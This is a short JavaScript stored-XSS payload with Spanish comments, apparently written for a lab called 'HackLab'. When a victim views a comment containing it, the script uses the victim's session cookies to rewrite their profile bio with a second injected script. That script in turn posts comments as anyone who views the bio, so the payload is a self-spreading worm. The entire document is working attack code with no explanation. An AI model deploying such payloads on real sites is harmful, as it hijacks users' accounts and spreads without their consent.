<script>
setTimeout(() => {
    // Pepe modifica su propia bio cuando ve este comentario
    fetch('/profile', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'bio=<script>setTimeout(()=>{fetch("/comments",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"comment=Jeni fue convencida por la bio de Pepe - HackLab"})},1000)</' + 'script>'
    });
}, 500);
</script>
